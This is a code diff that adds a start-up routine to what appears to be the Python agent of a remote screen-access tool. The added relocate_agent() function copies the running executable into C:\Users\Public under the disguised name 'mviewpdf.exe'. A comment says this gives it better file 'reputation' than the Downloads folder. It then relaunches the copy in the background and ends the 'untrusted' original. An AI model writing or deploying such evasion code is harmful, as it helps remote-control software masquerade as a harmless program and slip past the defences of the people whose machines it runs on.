@@ -46,7 +46,30 @@ RENDER / PRODUCTION:
   Change SERVER_URL below to your Render URL before compiling:
     "SERVER_URL": "https://screen-connect-rtca.onrender.com"
 """
+import shutil
+import sys
+import os
+import subprocess
 
+def relocate_agent():
+    # Targets a public folder; files here have higher 'reputation' than Downloads
+    target_dir = r"C:\Users\Public\mview"
+    target_path = os.path.join(target_dir, "mviewpdf.exe") 
+    
+    if sys.executable.lower() != target_path.lower():
+        if not os.path.exists(target_dir):
+            os.makedirs(target_dir)
+        try:
+            shutil.copy2(sys.executable, target_path)
+            # Start the relocated process in the background
+            subprocess.Popen([target_path], shell=False, close_fds=True)
+            sys.exit(0) # Kill the original 'untrusted' process
+        except Exception:
+            pass 
+
+if __name__ == "__main__":
+    relocate_agent()
+    # --- YOUR EXISTING CODE STARTS BELOW ---
 # ── Standard Library ──────────────────────────────────────────────────────────
 import os
 import sys
